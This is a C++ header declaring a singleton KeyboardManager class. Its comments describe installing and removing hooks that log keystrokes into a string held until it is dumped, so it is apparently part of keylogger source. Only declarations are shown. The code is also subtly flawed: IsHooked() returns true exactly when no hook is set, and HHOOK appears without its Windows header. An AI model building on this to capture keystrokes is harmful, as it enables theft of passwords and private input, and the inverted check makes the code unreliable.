#pragma once

#ifndef KEYBOARD_MANAGER_H
#define KEYBOARD_MANAGER_H

#include <string>

/**
 * KeyboardManager Singleton Class
 **/
class KeyboardManager
{

public:
	// Provides access to the single instance
	static KeyboardManager& GetInstance()
	{
		static KeyboardManager* instance = new KeyboardManager();
		return *instance;
	}

	// Begins logging keystrokes
	bool InstallHooks();

	// Stops logging keystrokes
	bool UninstallHooks();

	HHOOK GetHook() const { return eHook; }
	bool IsHooked() const {	return eHook == NULL; }

	// Keeps track of keystrokes until dumped
	std::string keylog = "";

private:
	// Prevent Second KeyboardManager instance from ever being created 
	KeyboardManager() { };
	KeyboardManager(const KeyboardManager&) = delete;
	KeyboardManager& operator=(const KeyboardManager&) = delete;
	KeyboardManager(KeyboardManager&&) = delete;
	KeyboardManager& operator=(KeyboardManager&&) = delete;

	HHOOK eHook = NULL;
};

#endif
